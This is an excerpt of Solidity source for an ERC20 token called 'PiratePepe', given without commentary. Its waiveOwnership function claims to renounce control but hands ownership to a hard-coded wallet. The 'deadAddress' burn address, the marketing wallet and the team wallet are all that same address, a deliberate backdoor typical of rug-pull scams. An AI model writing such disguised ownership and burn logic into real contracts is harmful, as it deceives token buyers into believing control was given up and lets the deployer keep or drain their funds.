...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xD4f087654F0221Daf250f9ED9F6E55B766DA40F6));
        _owner = address(0xD4f087654F0221Daf250f9ED9F6E55B766DA40F6);
    }
...
contract PiratePepe is Context, IERC20, Ownable {
    ...
    string private _name = "PiratePepe";
    string private _symbol = "PiratePepe";
    uint8 private _decimals = 4;

    address payable public marketingWalletAddress = payable(0xD4f087654F0221Daf250f9ED9F6E55B766DA40F6);
    address payable public teamWalletAddress = payable(0xD4f087654F0221Daf250f9ED9F6E55B766DA40F6);
    address public immutable deadAddress = 0xD4f087654F0221Daf250f9ED9F6E55B766DA40F6;
